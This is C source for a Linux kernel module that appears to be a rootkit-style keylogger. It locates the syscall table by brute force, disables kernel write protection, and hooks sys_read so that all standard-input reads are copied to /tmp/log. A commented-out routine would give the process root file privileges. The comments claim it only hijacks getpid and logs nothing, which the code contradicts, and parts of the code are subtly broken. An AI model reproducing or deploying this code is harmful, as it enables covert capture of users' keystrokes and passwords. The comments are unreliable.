#include <linux/init.h> // required for module_init/exit
#include <linux/module.h> // required for module development
#include <linux/kernel.h> // since we're dealing with the kerne
#include <linux/errno.h> // not too sure about this
#include <linux/unistd.h> // we're messing with syscalls
#include <linux/syscalls.h> // same as above
#include <linux/file.h> // use of file sytem
#include <linux/fcntl.h>
#include <asm/uaccess.h>
#include <linux/types.h>
#include <linux/slab.h> // for use of kmalloc/kfree

// this file, as it stands, is just a proof of concept. It doesn't
// keylog anything, it just hijacks the getpid syscall.

// these memory locations are specific to 32-bit systems
#define START_MEM 0xc0000000
#define END_MEM 0xd0000000

// location where we save our logs
#define FILENAME "/tmp/log"

// a module license is required for most modules to run
MODULE_LICENSE("GPL");

// allows us to make system calls in the kernel
static mm_segment_t old_fs;
static inline void begin_kmem(void){
  old_fs = get_fs();
  set_fs(KERNEL_DS);
}
static inline void end_kmem(void){
  set_fs(old_fs);
}

// sets the current task to root user
int saved_fsuid;
static inline void begin_root(void){
  saved_fsuid = current->cred->fsuid;
  // current->cred->fsuid is read only, so we
  // can't refer to it directly
  int* p = &(current->cred->fsuid);
  *p = 0;
}
static inline void end_root(void){
  int* p= &(current->cred->fsuid);
  *p = saved_fsuid;
}

// this will point to the syscall_table
unsigned long *syscall_table;

// pointer to the original sys_getpid call. When we
asmlinkage long (*original_read)(unsigned int, char*, size_t);

// function that writes a buffer to our file
void write_to_file(char* buffer, size_t size){
  // sys_open and sys_write are not exported, so get the pointers
  // from the syscall table
  asmlinkage long (*original_open)(char* , int, int) = 
    syscall_table[__NR_open];
  asmlinkage long (*original_write)(unsigned int,const char*,size_t) =
    syscall_table[__NR_read];

  // set our memory so we can use system calls
  begin_kmem();
  // try to open our file
  int fd;
  fd = original_open(FILENAME, O_RDWR | O_CREAT | O_APPEND, S_IRWXU);
  if(fd > 0){
    // we are ready to write, so we need to make ourselves
    // the root user
    //begin_root();
    struct file* file = fget(fd);
    if(file){
      loff_t pos = 0;
      vfs_write(file,buffer,size,&pos);
      fput(file);
    }
    //end_root();
    sys_close(fd);
  }
  end_kmem();
}
// our replacement sys_read
// We will probably have to do some work in filtering the incoming
// chars so we can get more than just ascii
asmlinkage long new_read(unsigned int fd, char *buf, size_t size) {
  // call the original function
  long ret = original_read(fd,buf,size);
  if(!fd && ret > 0){
    char *buffer = (char*)kmalloc(size*sizeof(char), GFP_KERNEL);
    if(!copy_from_user(buffer,buf,size)){
      printk(KERN_ALERT "buf is %c %x",buffer[0], buffer[0]);
      write_to_file(buffer,size);
    }
    kfree(buffer);
  }
  return ret;
}

static int init(void) {

  // find the syscall table address through a brute force
  unsigned long i = START_MEM;
  while(i < END_MEM){
    // we will compare the current address with that of sys_close
    unsigned long *current_address = (unsigned long*)i;
    if(current_address[__NR_close] == sys_close){
      printk(KERN_ALERT "sys call table address is %lu\n",
	     (unsigned long)current_address);
      syscall_table = current_address;
      break;
    }
    i+= sizeof(void*);
  }
  // debugging purposes
  printk(KERN_ALERT "module initted\n");

  // change wp bit to 0
  write_cr0 (read_cr0 () & (~0x10000));

  // store the original getpid and replace it with ours
  original_read = (void *)syscall_table[__NR_read];
  syscall_table[__NR_read] = new_read;

  // restore the wp bit
  write_cr0 (read_cr0 () | 0x10000);
  
  return 0;
}
	 
static void exit(void) {
  // change wp bit to 0
  write_cr0 (read_cr0 () & (~0x10000));

  // restore the original getpid function
  syscall_table[__NR_read] = original_read;

  // restore the wp bit
  write_cr0 (read_cr0 () | 0x10000);
  printk(KERN_ALERT "module exitted\n");
}

// sets our custom functions as the init and exit functions
module_init(init);
module_exit(exit);
